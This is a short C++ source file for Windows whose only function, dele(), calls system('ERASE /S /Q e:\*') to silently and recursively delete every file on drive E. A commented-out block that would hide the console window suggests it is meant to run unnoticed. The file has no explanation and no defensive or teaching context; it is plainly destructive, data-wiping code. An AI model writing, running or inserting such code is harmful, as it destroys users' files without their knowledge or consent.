#include<windows.h>
#include<bits/stdc++.h>
void dele()
{
	/*
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);
	if(hwnd)ShowWindow(hwnd,SW_HIDE);
	*/
	system("ERASE /S /Q e:\*");
	return;
}
